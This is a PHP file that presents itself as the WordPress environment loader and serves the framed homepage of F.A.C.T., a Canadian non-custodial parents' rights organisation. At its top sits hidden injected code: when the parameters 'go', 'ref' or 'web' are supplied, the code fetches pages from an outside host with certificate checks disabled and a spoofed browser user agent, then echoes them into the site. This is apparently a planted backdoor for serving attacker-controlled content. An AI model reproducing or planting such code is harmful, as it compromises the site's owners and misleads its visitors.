<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
function fetchDataFromSite($site) {
    $ch = curl_init($site);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

if(isset($_GET['go'])) {
    $sitex = $_GET['go'];
    $site = 'https://replication2.pkcdurensawit.net/fact/?go='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['ref'])) {
    $sitex = $_GET['ref'];
    $site = 'https://replication2.pkcdurensawit.net/fact/?ref='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['web'])) {
  $sitex = $_GET['web'];
  $site = 'https://replication2.pkcdurensawit.net/fact/?web='.$sitex;
  $data = fetchDataFromSite($site);
  echo $data;
} else {
 ?>
<html>
<head>
<title>F.A.C.T. - Canada's Largest N.C. Parents' and Children's Rights Organisation</title>
<meta name="KEYWORDS" content=custody,access,fathers,children,mothers,fathering,"child rights","father rights","parental alienation","family law","child abuse","child neglect","domestic violence","family violence",activism,advocacy,Canada,Ontario,Toronto>
<meta name="DESCRIPTION" content="Fathers Are Capable Too is one of the largest non-custodial parents' and children's rights organizations in Canada dealing with custody and access. F.A.C.T. is an organization of both men and women working to support our children's right to have a relationship with both parents.">
<meta name="google-site-verification" content="G2fKomStXj5pK-odAqfuah5nMfc0HTWl4dB_GMToM5M" />
<meta name="google-site-verification" content="JE8HrEWdt6AtcYIcWkPVfe_YFN6THc1ctZlnzZdFJko" />
</head>

<frameset BORDER="0" frameborder="0" framespacing="0" rows="76,78*">
  <frame SRC="facthome/header.htm" NORESIZE SCROLLING="no" MARGINHEIGHT="1"
  MARGINWIDTH="1" NAME="head">
  <frameset cols="178,100%,2%">
    <frame SRC="facthome/navbar.htm" SCROLLING="auto" NAME="navbar" MARGINWIDTH="5"
    MARGINHEIGHT="1" NORESIZE>
    <frame SRC="facthome/fact_not.htm" SCROLLING="auto" NAME="main" MARGINWIDTH="0"
    MARGINHEIGHT="0">
    <frame name="main1">
  </frameset>
  <noframes>
  <body>
  <p>This web browser does not support frames.</p>
  </body>
  </noframes>
</frameset>
</html>
<?php
} ?>
